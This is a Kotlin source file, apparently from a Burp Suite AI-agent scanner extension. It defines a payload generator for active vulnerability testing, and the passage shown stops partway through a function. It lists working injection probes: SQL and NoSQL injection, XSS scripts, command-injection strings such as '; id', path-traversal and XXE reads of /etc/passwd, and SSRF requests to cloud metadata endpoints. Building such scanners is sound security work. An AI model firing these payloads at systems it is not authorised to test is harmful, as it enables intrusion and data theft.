package com.six2dez.burp.aiagent.scanner

import burp.api.montoya.http.message.HttpRequestResponse

/**
 * Generates payloads for active vulnerability testing
 * Focus on HIGH CONFIDENCE detection to minimize false positives
 */
class PayloadGenerator {

    // Static payloads organized by vulnerability class and risk level
    private val staticPayloads: Map<VulnClass, List<Payload>> = mapOf(
        
        // ==================== SQL INJECTION ====================
        VulnClass.SQLI to listOf(
            // Error-based - look for specific DB errors
            Payload("'", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("\"", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("'--", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("';--", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("1'", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("1\"", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("\\", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL escape error"),
            Payload("1'\"", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.SAFE, "SQL syntax error"),
            Payload("1' AND '1'='1", VulnClass.SQLI, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Same response"),
            Payload("1' AND '1'='2", VulnClass.SQLI, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Different response"),
            Payload("1 AND 1=1", VulnClass.SQLI, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Same response"),
            Payload("1 AND 1=2", VulnClass.SQLI, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Different response"),
            // Time-based - requires significant delay
            Payload("1' AND SLEEP(5)--", VulnClass.SQLI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
            Payload("1'; WAITFOR DELAY '0:0:5'--", VulnClass.SQLI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
            Payload("1' AND pg_sleep(5)--", VulnClass.SQLI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
            // UNION-based - MODERATE risk
            Payload("' UNION SELECT NULL--", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.MODERATE, "Column mismatch"),
            Payload("' UNION SELECT NULL,NULL--", VulnClass.SQLI, DetectionMethod.ERROR_BASED, PayloadRisk.MODERATE, "Column mismatch"),
        ),
        
        // ==================== XSS REFLECTED ====================
        VulnClass.XSS_REFLECTED to listOf(
            // Use unique markers to avoid false positives
            Payload("<script>alert('XSS-BURP-AI-1337')</script>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Script reflected"),
            Payload("<img src=x onerror=alert('XSS-BURP-AI-1337')>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Event handler"),
            Payload("<svg onload=alert('XSS-BURP-AI-1337')>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "SVG onload"),
            Payload("'\"><script>alert('XSS-BURP-AI-1337')</script>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Breakout + script"),
            Payload("<body onload=alert('XSS-BURP-AI-1337')>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Body onload"),
            Payload("javascript:alert('XSS-BURP-AI-1337')", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "JS protocol"),
            // Encoding bypass
            Payload("<ScRiPt>alert('XSS-BURP-AI-1337')</sCrIpT>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Case bypass"),
            Payload("</script><script>alert('XSS-BURP-AI-1337')</script>", VulnClass.XSS_REFLECTED, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Script breakout"),
        ),
        
        // ==================== DOM XSS ====================
        VulnClass.XSS_DOM to listOf(
            // DOM XSS payloads - need to look for sinks in response
            Payload("#<script>alert('DOM-XSS-BURP-AI')</script>", VulnClass.XSS_DOM, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "Hash injection"),
            Payload("javascript:alert('DOM-XSS')//", VulnClass.XSS_DOM, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "JS protocol in DOM"),
            // These detect DOM sinks, not direct XSS
            Payload("'-alert('DOM-XSS-BURP-AI')-'", VulnClass.XSS_DOM, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "JS context"),
        ),
        
        // ==================== LFI ====================
        VulnClass.LFI to listOf(
            Payload("../../../etc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("....//....//....//etc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("..%2f..%2f..%2fetc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("..%252f..%252f..%252fetc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("/etc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("file:///etc/passwd", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("..\\..\\..\\windows\\win.ini", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "[fonts]"),
            Payload("C:\\windows\\win.ini", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "[fonts]"),
            Payload("../../../etc/passwd%00", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Null byte"),
            Payload("....//....//....//etc/passwd%00.jpg", VulnClass.LFI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Extension bypass"),
        ),
        
        // ==================== PATH TRAVERSAL ====================
        VulnClass.PATH_TRAVERSAL to listOf(
            Payload("../", VulnClass.PATH_TRAVERSAL, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Directory listing"),
            Payload("..%2f", VulnClass.PATH_TRAVERSAL, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Encoded traversal"),
            Payload("%2e%2e%2f", VulnClass.PATH_TRAVERSAL, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Full encoded"),
            Payload("..%252f", VulnClass.PATH_TRAVERSAL, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Double encoded"),
        ),
        
        // ==================== SSTI ====================
        VulnClass.SSTI to listOf(
            // Use highly unique math results to avoid false positives (97601, 94011 are rare in normal content)
            Payload("{{1337*73}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "97601 in response"),
            Payload("{{31337*3}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "94011 in response"),
            Payload("{{7*'7'}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "7777777 (Jinja2)"),
            Payload("\${1337*73}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "97601"),
            Payload("<%= 1337*73 %>", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "97601"),
            Payload("#{1337*73}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "97601"),
            Payload("*{1337*73}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "97601 (Thymeleaf)"),
            Payload("{{config}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Config dump"),
            Payload("{{request}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Request object"),
            Payload("{{''.__class__}}", VulnClass.SSTI, DetectionMethod.CONTENT_BASED, PayloadRisk.MODERATE, "Python class"),
        ),
        
        // ==================== COMMAND INJECTION ====================
        VulnClass.CMDI to listOf(
            Payload("; id", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("| id", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("|| id", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("& id", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("&& id", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("`id`", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("\$(id)", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "uid="),
            Payload("| whoami", VulnClass.CMDI, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Username"),
            // Time-based for blind
            Payload("; sleep 5", VulnClass.CMDI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
            Payload("| sleep 5", VulnClass.CMDI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
            Payload("& ping -c 5 127.0.0.1 &", VulnClass.CMDI, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
        ),
        
        // ==================== SSRF ====================
        VulnClass.SSRF to listOf(
            Payload("http://127.0.0.1", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Local response"),
            Payload("http://localhost", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Local response"),
            Payload("http://[::1]", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "IPv6 local"),
            Payload("http://127.0.0.1:22", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "SSH banner"),
            Payload("http://127.0.0.1:3306", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "MySQL"),
            Payload("http://169.254.169.254/latest/meta-data/", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.MODERATE, "AWS metadata"),
            Payload("http://metadata.google.internal/computeMetadata/v1/", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.MODERATE, "GCP metadata"),
            Payload("file:///etc/passwd", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "File read"),
            Payload("dict://127.0.0.1:11211/stats", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Memcached"),
            Payload("gopher://127.0.0.1:6379/_INFO", VulnClass.SSRF, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Redis"),
        ),
        
        // ==================== OPEN REDIRECT ====================
        VulnClass.OPEN_REDIRECT to listOf(
            Payload("//evil.com", VulnClass.OPEN_REDIRECT, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Location header"),
            Payload("https://evil.com", VulnClass.OPEN_REDIRECT, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Location header"),
            Payload("/\\evil.com", VulnClass.OPEN_REDIRECT, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Backslash bypass"),
            Payload("////evil.com", VulnClass.OPEN_REDIRECT, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Multi-slash"),
            Payload("https:evil.com", VulnClass.OPEN_REDIRECT, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Missing slash"),
        ),
        
        // ==================== HEADER/CRLF INJECTION ====================
        VulnClass.HEADER_INJECTION to listOf(
            Payload("value\r\nX-Injected: burp-ai-test", VulnClass.HEADER_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "X-Injected header"),
            Payload("value%0d%0aX-Injected:%20burp-ai-test", VulnClass.HEADER_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Encoded CRLF"),
        ),
        
        VulnClass.CRLF_INJECTION to listOf(
            Payload("%0d%0aSet-Cookie:%20burp-ai-test=true", VulnClass.CRLF_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Cookie injection"),
            Payload("\r\nSet-Cookie: burp-ai-test=true", VulnClass.CRLF_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Cookie injection"),
        ),
        
        // ==================== XXE ====================
        VulnClass.XXE to listOf(
            Payload("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""", 
                VulnClass.XXE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "root:x:0:0"),
            Payload("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""", 
                VulnClass.XXE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "[fonts]"),
        ),
        
        // ==================== IDOR/BOLA - Context needed ====================
        VulnClass.IDOR to listOf(),
        VulnClass.BOLA to listOf(),
        
        // ==================== JWT WEAKNESS ====================
        VulnClass.JWT_WEAKNESS to listOf(
            Payload("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", VulnClass.JWT_WEAKNESS, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "alg:none accepted"),
        ),
        
        // ==================== NoSQL INJECTION ====================
        VulnClass.NOSQL_INJECTION to listOf(
            // MongoDB
            Payload("{\"\$gt\": \"\"}", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Different response"),
            Payload("{\"\$ne\": null}", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Bypass condition"),
            Payload("{\"\$regex\": \".*\"}", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "Regex match all"),
            Payload("' || '1'=='1", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "JS injection"),
            Payload("'; return true; var x='", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_BOOLEAN, PayloadRisk.SAFE, "JS injection"),
            // Time-based
            Payload("{\"\$where\": \"sleep(5000)\"}", VulnClass.NOSQL_INJECTION, DetectionMethod.BLIND_TIME, PayloadRisk.SAFE, "5s delay", 5000),
        ),
        
        // ==================== GraphQL INJECTION ====================
        VulnClass.GRAPHQL_INJECTION to listOf(
            // Introspection
            Payload("{__schema{types{name}}}", VulnClass.GRAPHQL_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "__Schema in response"),
            Payload("{__type(name:\"Query\"){fields{name}}}", VulnClass.GRAPHQL_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Field names"),
            // Batching attack
            Payload("[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]", VulnClass.GRAPHQL_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Batch accepted"),
        ),
        
        // ==================== LOG INJECTION ====================
        VulnClass.LOG_INJECTION to listOf(
            Payload("test\nINFO: Injected log entry", VulnClass.LOG_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Log injection"),
            Payload("test\r\n[ERROR] Fake error", VulnClass.LOG_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "CRLF in logs"),
        ),
        
        // ==================== CORS MISCONFIGURATION ====================
        VulnClass.CORS_MISCONFIGURATION to listOf(
            // These are header-based tests - Origin header manipulation
            Payload("https://evil.com", VulnClass.CORS_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "ACAO: evil.com"),
            Payload("null", VulnClass.CORS_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "ACAO: null"),
        ),
        
        // ==================== SESSION/AUTH ISSUES ====================
        VulnClass.SESSION_FIXATION to listOf(),  // Requires multi-step testing
        VulnClass.WEAK_SESSION_TOKEN to listOf(),  // Requires token analysis
        VulnClass.AUTH_BYPASS to listOf(),  // Context-specific

        // ==================== RATE LIMIT BYPASS ====================
        VulnClass.RATE_LIMIT_BYPASS to listOf(),  // Requires multiple requests

        // ==================== HOST HEADER INJECTION ====================
        VulnClass.HOST_HEADER_INJECTION to listOf(
            Payload("evil-burp-ai-test.com", VulnClass.HOST_HEADER_INJECTION, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "evil-burp-ai-test.com in response"),
            Payload("localhost", VulnClass.HOST_HEADER_INJECTION, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "localhost reflected"),
            Payload("127.0.0.1", VulnClass.HOST_HEADER_INJECTION, DetectionMethod.REFLECTION, PayloadRisk.SAFE, "127.0.0.1 reflected"),
        ),

        // ==================== EMAIL HEADER INJECTION ====================
        VulnClass.EMAIL_HEADER_INJECTION to listOf(
            Payload("test@test.com%0aCc:attacker@evil.com", VulnClass.EMAIL_HEADER_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Cc header injected"),
            Payload("test@test.com%0d%0aBcc:attacker@evil.com", VulnClass.EMAIL_HEADER_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Bcc header injected"),
            Payload("test@test.com\r\nSubject:Injected", VulnClass.EMAIL_HEADER_INJECTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Subject injected"),
        ),

        // ==================== ACCOUNT TAKEOVER ====================
        VulnClass.ACCOUNT_TAKEOVER to listOf(),  // Context-specific, detected via passive analysis

        // ==================== OAUTH MISCONFIGURATION ====================
        VulnClass.OAUTH_MISCONFIGURATION to listOf(
            Payload("https://evil-burp-ai.com/callback", VulnClass.OAUTH_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Redirect accepted"),
            Payload("https://legitimate.com.evil-burp-ai.com", VulnClass.OAUTH_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Subdomain bypass"),
            Payload("https://legitimate.com@evil-burp-ai.com", VulnClass.OAUTH_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "@ bypass"),
            Payload("https://legitimate.com%40evil-burp-ai.com", VulnClass.OAUTH_MISCONFIGURATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Encoded @ bypass"),
        ),

        // ==================== MFA BYPASS ====================
        VulnClass.MFA_BYPASS to listOf(),  // Requires multi-step testing

        // ==================== PRICE MANIPULATION ====================
        VulnClass.PRICE_MANIPULATION to listOf(
            Payload("-1", VulnClass.PRICE_MANIPULATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Negative value accepted"),
            Payload("0", VulnClass.PRICE_MANIPULATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Zero value accepted"),
            Payload("0.001", VulnClass.PRICE_MANIPULATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Near-zero accepted"),
            Payload("999999999", VulnClass.PRICE_MANIPULATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Large value accepted"),
            Payload("-999999999", VulnClass.PRICE_MANIPULATION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Large negative accepted"),
        ),

        // ==================== RACE CONDITIONS (TOCTOU) ====================
        VulnClass.RACE_CONDITION_TOCTOU to listOf(),  // Requires concurrent requests

        // ==================== CACHE POISONING ====================
        VulnClass.CACHE_POISONING to listOf(
            // X-Forwarded-Host header injection
            Payload("evil-burp-ai-cache.com", VulnClass.CACHE_POISONING, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Host reflected in cached response"),
        ),

        // ==================== CACHE DECEPTION ====================
        VulnClass.CACHE_DECEPTION to listOf(
            // Path suffix attacks
            Payload("/nonexistent.css", VulnClass.CACHE_DECEPTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Sensitive data with static extension"),
            Payload("/..%2fstatic.js", VulnClass.CACHE_DECEPTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Path confusion"),
            Payload("/.css", VulnClass.CACHE_DECEPTION, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Hidden extension"),
        ),

        // ==================== SOURCE MAP DISCLOSURE ====================
        VulnClass.SOURCEMAP_DISCLOSURE to listOf(),  // Passive detection via headers/comments

        // ==================== GIT EXPOSURE ====================
        VulnClass.GIT_EXPOSURE to listOf(
            Payload("/.git/HEAD", VulnClass.GIT_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "ref: refs/heads/"),
            Payload("/.git/config", VulnClass.GIT_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "[core]"),
            Payload("/.git/index", VulnClass.GIT_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "DIRC"),
            Payload("/.svn/entries", VulnClass.GIT_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "dir"),
            Payload("/.svn/wc.db", VulnClass.GIT_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "SQLite"),
        ),

        // ==================== BACKUP FILE DISCLOSURE ====================
        VulnClass.BACKUP_DISCLOSURE to listOf(
            Payload(".bak", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Backup file content"),
            Payload(".old", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Old file content"),
            Payload("~", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Tilde backup"),
            Payload(".swp", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Vim swap file"),
            Payload(".save", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Save file"),
            Payload(".orig", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Original file"),
            Payload(".copy", VulnClass.BACKUP_DISCLOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Copy file"),
        ),

        // ==================== DEBUG EXPOSURE ====================
        VulnClass.DEBUG_EXPOSURE to listOf(
            Payload("/debug", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Debug info"),
            Payload("/trace", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Trace info"),
            Payload("/actuator", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Spring actuator"),
            Payload("/actuator/env", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Environment"),
            Payload("/actuator/health", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Health endpoint"),
            Payload("/elmah.axd", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "ELMAH errors"),
            Payload("/_profiler", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Symfony profiler"),
            Payload("/telescope", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Laravel telescope"),
            Payload("/__debug__", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Flask debug"),
            Payload("/phpinfo.php", VulnClass.DEBUG_EXPOSURE, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "PHP info"),
        ),

        // ==================== S3 MISCONFIGURATION ====================
        VulnClass.S3_MISCONFIGURATION to listOf(),  // Detected via URL patterns and policy testing

        // ==================== SUBDOMAIN TAKEOVER ====================
        VulnClass.SUBDOMAIN_TAKEOVER to listOf(),  // Detected via error messages

        // ==================== API VERSION BYPASS ====================
        VulnClass.API_VERSION_BYPASS to listOf(
            Payload("/api/v1/", VulnClass.API_VERSION_BYPASS, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Old API version accessible"),
            Payload("/api/v0/", VulnClass.API_VERSION_BYPASS, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Beta API version"),
            Payload("/api/beta/", VulnClass.API_VERSION_BYPASS, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Beta version"),
            Payload("/api/internal/", VulnClass.API_VERSION_BYPASS, DetectionMethod.CONTENT_BASED, PayloadRisk.SAFE, "Internal API"),
        ),

        // ==================== 403 BYPASS / ACCESS CONTROL BYPASS ====================
        VulnClass.ACCESS_CONTROL_BYPASS to listOf(), // Uses custom execute403Bypass() logic, not standard payloads

        // ==================== MISCONFIGURATION DETECTION ====================
        // These are passive checks, not active payloads
        VulnClass.DEBUG_ENDPOINT to listOf(),
        VulnClass.STACK_TRACE_EXPOSURE to listOf(),
        VulnClass.VERSION_DISCLOSURE to listOf(),
        VulnClass.MISSING_SECURITY_HEADERS to listOf(),
        VulnClass.VERBOSE_ERROR to listOf(),
        VulnClass.DIRECTORY_LISTING to listOf(),
        VulnClass.INSECURE_COOKIE to listOf(),
        VulnClass.SENSITIVE_DATA_URL to listOf(),
        VulnClass.WEAK_CRYPTO to listOf(),
        VulnClass.REQUEST_SMUGGLING to listOf(),
        VulnClass.CSRF to listOf(),
        VulnClass.UNRESTRICTED_FILE_UPLOAD to listOf(),
    )

    /**
     * Get quick static payloads for a vulnerability class
     * Filtered by max risk level
     */
    fun getQuickPayloads(vulnClass: VulnClass, maxRisk: PayloadRisk = PayloadRisk.SAFE): List<Payload> {
        return staticPayloads[vulnClass]
            ?.filter { it.risk <= maxRisk }
            ?: emptyList()
    }

    /**
     * Get all payloads for a vulnerability class
     */
    fun getAllPayloads(vulnClass: VulnClass): List<Payload> {
        return staticPayloads[vulnClass] ?: emptyList()
    }

    /**
     * Generate context-aware payloads based on the original value
     * This is critical for IDOR/BOLA where we need to test adjacent IDs
     */
    fun generateContextAwarePayloads(
        vulnClass: VulnClass,
        originalValue: String,
        maxPayloads: Int = 5
    ): List<Payload> {
        return when (vulnClass) {
            VulnClass.IDOR, VulnClass.BOLA -> generateIdorPayloads(originalValue, maxPayloads)
            VulnClass.SQLI -> generateSqliPayloads(originalValue, maxPayloads)
            else -> emptyList()
        }
    }

    /**
     * Generate IDOR payloads by manipulating the original ID value
     * The key is testing if we get DIFFERENT user's data with adjacent IDs
     */
    private fun generateIdorPayloads(originalValue: String, maxPayloads: Int): List<Payload> {
        val payloads = mutableListOf<Payload>()
        
        // If numeric ID
        val numValue = originalValue.toLongOrNull()
        if (numValue != null) {
            // Test adjacent IDs - if we get valid data for another user's ID, it's IDOR
            if (numValue > 1) {
                payloads.add(Payload(
                    (numValue - 1).toString(), 
                    VulnClass.IDOR, 
                    DetectionMethod.CONTENT_BASED, 
                    PayloadRisk.SAFE,
                    "Different user data (ID-1)"
                ))
            }
            payloads.add(Payload(
                (numValue + 1).toString(), 
                VulnClass.IDOR, 
                DetectionMethod.CONTENT_BASED, 
                PayloadRisk.SAFE,
                "Different user data (ID+1)"
            ))
            // Test first ID (often admin)
            if (numValue > 1) {
                payloads.add(Payload(
                    "1", 
                    VulnClass.IDOR, 
                    DetectionMethod.CONTENT_BASED, 
                    PayloadRisk.SAFE,
                    "First ID (possible admin)"
                ))
            }
            // Test zero
            payloads.add(Payload(
                "0", 
                VulnClass.IDOR, 
                DetectionMethod.CONTENT_BASED, 
                PayloadRisk.SAFE,
                "Zero ID edge case"
            ))
            // Test negative (may bypass checks)
            payloads.add(Payload(
                "-1", 
                VulnClass.IDOR, 
                DetectionMethod.CONTENT_BASED, 
                PayloadRisk.SAFE,
                "Negative ID edge case"
            ))
        }
        
        // If UUID, try modifying last character
        if (originalValue.matches(Regex("[a-f0-9-]{36}", RegexOption.IGNORE_CASE))) {
            val lastChar = originalValue.last()
            val newChar = if (lastChar == '0') '1' else '0'
            val modified = originalValue.dropLast(1) + newChar
            payloads.add(Payload(
                modified,
                VulnClass.IDOR,
                DetectionMethod.CONTENT_BASED,
                PayloadRisk.SAFE,
                "Modified UUID"
            ))
        }
        
        return payloads.take(maxPayloads)
    }

    /**
     * Generate context-aware SQLi payloads
     */
    private fun generateSqliPayloads(originalValue: String, maxPayloads: Int): List<Payload> {
        val payloads = mutableListOf<Payload>()
        
        val numValue = originalValue.toLongOrNull()
        if (numValue != null) {
            // Numeric context - no quotes needed
            payloads.add(Payload(
                "$originalValue AND 1=1",
                VulnClass.SQLI,
                DetectionMethod.BLIND_BOOLEAN,
                PayloadRisk.SAFE,
                "Same response as original"
            ))
            payloads.add(Payload(
                "$originalValue AND 1=2",
                VulnClass.SQLI,
                DetectionMethod.BLIND_BOOLEAN,
                PayloadRisk.SAFE,
                "Different/empty response"
            ))
        } else {
            // String context - need quotes
            payloads.add(Payload(
                "$originalValue' AND '1'='1",
                VulnClass.SQLI,
                DetectionMethod.BLIND_BOOLEAN,
                PayloadRisk.SAFE,
                "Same response as original"
